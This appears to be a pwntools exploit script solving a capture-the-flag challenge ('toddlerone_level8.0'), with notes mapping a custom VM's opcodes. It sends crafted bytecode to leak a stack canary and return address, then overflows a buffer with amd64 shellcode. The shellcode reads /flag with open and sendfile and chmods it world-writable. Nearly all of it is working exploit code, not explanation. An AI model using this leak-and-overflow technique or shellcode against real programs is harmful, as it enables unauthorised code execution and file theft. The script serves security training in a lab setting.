"""
0x401acd

imm - 0x10
add - 0x01
stk - 0x02
stm - 0x20
ldm - 0x04
cmp - 0x08
jmp - 0x80
sys - 0x40
    open - 02
    read 01 20
        b - offset
        c - size
        a - fd
    write 04
    exit 10
a = 40
b = 20
c = 01
d = 10
s = 08
i = 04
f = 20

"""

from pwn import *
p = process("/challenge/toddlerone_level8.0")

a = b'\xff\x01\x01\x68\x02\x01\x00\x40\x01\x10\x20\x80'
a = b'\x08\xff\x10\x08\x86\x08\x08\x00\x40\x01\x10\x01\x01\x10\x10'
a = b'\x40\x10\x01\x20\x10\xff\x01\x10\x61\x04\x40\x10\x40\x10\x00\x01\x10\x86\x20\x40\x10'
print(a)
print(p.readuntil(b'yancode: '))
p.send(a)
p.readuntil(b"... write")
x = p.readuntil(b'[s]')
print(x)
canary = x[10:18]
print("CANARY = ", canary)
x = x[::-1]
x = x[3:]
ret = x[0:8]
ret = ret[::-1]
ret = int.from_bytes(ret, 'little')
ret = ret - 0xe0
ret = ret.to_bytes(8, 'little')
print("RETURN = ", ret)
a = """	mov rax, 2	
	lea rdi, [rip + file]
	mov rsi, 0	
	syscall		
	mov rdi, 1	
	mov rsi, rax		
	mov rdx, 0		
	mov r10, 1000		
	mov rax, 40	
	syscall			
	mov rax, 90
    lea rdi, [rip + file]
    mov rsi, 0x1ff
	syscall
	mov rax, 60		
    mov rdi, 99
	syscall			
file:
	.string "/flag"
"""
context.arch = "amd64"

a = asm(a)


"""
                onebyte
                this                this
0x7ffd672912c0:	0x0000000000000000	0x0000754f870fc083 ret
0x7ffd672912d0:	0x0000754f87302620	0x00007ffd672913b8
0x7ffd672912e0:	0x0000000100000000	0x00005f28f4e762a8
0x7ffd672912f0:	0x00005f28f4e765a0	0xff1e5bdc403f2954
0x7ffd67291300:	0x00005f28f4e75140	0x00007ffd672913b0
"""

b = b'A'*9 + canary + b'B'*8 + ret + a
# b = 'a'*104
print(b)
print(hex(len(b)))
p.send(b)
print("sent")
print(p.readall())
